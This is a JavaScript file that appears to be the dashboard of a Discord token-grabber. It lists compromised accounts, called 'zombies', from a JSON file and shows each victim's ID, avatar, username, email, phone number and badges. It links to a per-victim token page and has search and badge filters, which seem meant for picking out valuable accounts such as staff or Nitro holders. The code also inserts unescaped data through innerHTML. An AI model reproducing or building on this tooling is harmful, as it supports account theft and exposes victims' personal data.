function AddToken(zombie) {
    users_list = document.getElementById("zombies");
    badges_list = "";

    zombie.badges.forEach(badge => {
        if(badge == "balance") {
            badges_list += `<img src="assets/badges/Balance.png" alt="" srcset="">`
        
        } else if(badge == "bravery") {
            badges_list += `<img src="assets/badges/Bravery.png" alt="" srcset="">`
        
        } else if(badge == "brilliance") {
            badges_list += `<img src="assets/badges/Brilliance.png" alt="" srcset="">`
        
        } else if(badge == "bughunter") {
            badges_list += `<img src="assets/badges/BugHunter.png" alt="" srcset="">`
        
        } else if(badge == "dev") {
            badges_list += `<img src="assets/badges/dev.png" alt="" srcset="">`
        
        } else if(badge == "early") {
            badges_list += `<img src="assets/badges/early.png" alt="" srcset="">`
        
        } else if(badge == "hypesquad") {
            badges_list += `<img src="assets/badges/hypeSquad.png" alt="" srcset="">`
        
        } else if(badge == "partner") {
            badges_list += `<img src="assets/badges/Partner.png" alt="" srcset="">`
        
        } else if(badge == "staff") {
            badges_list += `<img src="assets/badges/Staff.png" alt="" srcset="">`
        
        } else if(badge == "verified") {
            badges_list += `<img src="assets/badges/verif.png" alt="" srcset="">`
        
        } else if(badge == "nitroboost") {
            badges_list += `<img src="assets/badges/Nitro_Boost.png" alt="" srcset="">`
        
        } else if(badge == "nitrocl") {
            badges_list += `<img src="assets/badges/Nitro_cl.png" alt="" srcset="">`
        
        }
    })

    users_list.innerHTML += `
        <div class="zombie">
            <img class="user_pfp" src="https://cdn.discordapp.com/avatars/${zombie.id}/${zombie.avatar}" alt="" srcset="">
            <span>${zombie.username} (${zombie.id})</span>
            <p>${zombie.email}</p>
            <p>${zombie.phone}</p>
            <div class="badges">
                ${badges_list}
            </div>
            <a href="token.html?id=${zombie.id}">View All Infos</a>
        </div>
    `
}

d3.json("../data/zombies.json", function(error, data) {
    parser = JSON.stringify(data)
    zombies_data = JSON.parse(parser)
    zombies_list = zombies_data.zombies

    zombies_list.forEach(zombie => {
        AddToken(zombie)
    });
});

function SearchByUsername(username) {
    users_list = document.getElementById("zombies");
    users_list.innerHTML = ""

    d3.json("../data/zombies.json", function(error, data) {
        parser = JSON.stringify(data)
        zombies_data = JSON.parse(parser)
        zombies_list = zombies_data.zombies
    
        zombies_list.forEach(zombie => {
            if(zombie.username.toLowerCase().includes(username.value) && username.value != "") {
                AddToken(zombie)
            
            } else if(username.value == "") {
                AddToken(zombie)
            }
        });
    });
}

function SearchByGrade(grade) {
    users_list = document.getElementById("zombies");
    users_list.innerHTML = ""

    d3.json("../data/zombies.json", function(error, data) {
        parser = JSON.stringify(data)
        zombies_data = JSON.parse(parser)
        zombies_list = zombies_data.zombies
    
        zombies_list.forEach(zombie => {
            if(grade.value.toLowerCase() == "all") {
                AddToken(zombie)
            } else {
                zombie.badges.forEach(badge => {
                    if(badge.toLowerCase().includes(grade.value.toLowerCase())) {
                        AddToken(zombie)
                    }
                })
            }
        });
    });
}